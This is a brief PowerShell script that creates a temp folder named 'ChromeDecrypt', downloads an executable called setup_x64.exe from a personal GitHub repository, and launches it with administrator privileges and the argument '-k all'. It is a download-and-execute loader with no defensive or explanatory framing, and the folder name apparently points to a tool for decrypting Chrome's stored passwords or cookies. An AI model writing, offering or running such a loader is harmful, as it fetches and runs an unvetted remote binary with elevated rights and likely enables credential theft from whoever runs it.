# Simple Execution Script for setup_x64.exe
# Downloads and runs with admin privileges

# Create temp folder for download
$tempFolder = "$env:TEMP\ChromeDecrypt"
if (-not (Test-Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
}

# Download URL
$url = 'https://github.com/bunny1233/mynewscripts/raw/refs/heads/main/setup_x64.exe'
$outputFile = Join-Path $tempFolder 'setup_x64.exe'

# Download the file
Write-Host "Downloading setup_x64.exe..." -ForegroundColor Yellow
Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing

# Execute with admin privileges
Write-Host "Running with admin privileges..." -ForegroundColor Yellow
Start-Process -FilePath $outputFile -ArgumentList "-k all" -Verb RunAs
